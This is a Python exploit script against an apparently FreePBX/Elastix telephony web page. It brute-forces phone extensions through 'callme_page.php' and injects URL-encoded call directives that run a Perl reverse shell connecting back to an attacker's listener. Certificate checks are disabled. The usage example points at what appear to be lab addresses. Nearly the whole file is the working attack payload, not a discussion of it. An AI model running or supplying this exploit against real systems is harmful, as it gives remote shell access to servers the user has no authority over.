#!/bin/env python3

import urllib.request
import urllib.error
import ssl
import sys


STARTING_EXTENSION = 230 # YOU CAN CHANGE THE TESTING EXTENSION RANGE HERE


def exploit(rhost, lhost, lport):
    for extension in range(STARTING_EXTENSION, 1000):
        # URL with encoded PAYLOAD
        url = f"https://{rhost}/recordings/misc/callme_page.php?action=c&callmenum={extension}" \
                  f"@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%2" \
                  f"7%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28P" \
                  f"eerAddr%2c%22{lhost}%3a{lport}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-" \
                  f"%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"
        # 
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_ciphers('DEFAULT@SECLEVEL=1')

        try:
            with urllib.request.urlopen(url, context=context) as data:
                call = data.read()
                if "Click here to hang up" in str(call):
                    print(f"[*] Found positive extension: {extension}")
                    exit(0)
        except KeyboardInterrupt as err:
            print("\n[-] Stopped by user")
            quit()
        except urllib.error.HTTPError as err:
            print(f"[!] {extension} http error: {err.code}")
        except urllib.error.URLError as err:
            print(f"[!] url error: {err.reason}")
        else:
            print(f"[-] trying extention: {extension}")


if len(sys.argv) != 4:
    print("Usage: ./4869.py [RHOST] [LHOST] [LPORT]\n")
    print("Example: ./4869.py 10.129.88.31 10.10.14.48 9001\n")
    sys.exit(1)
else:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
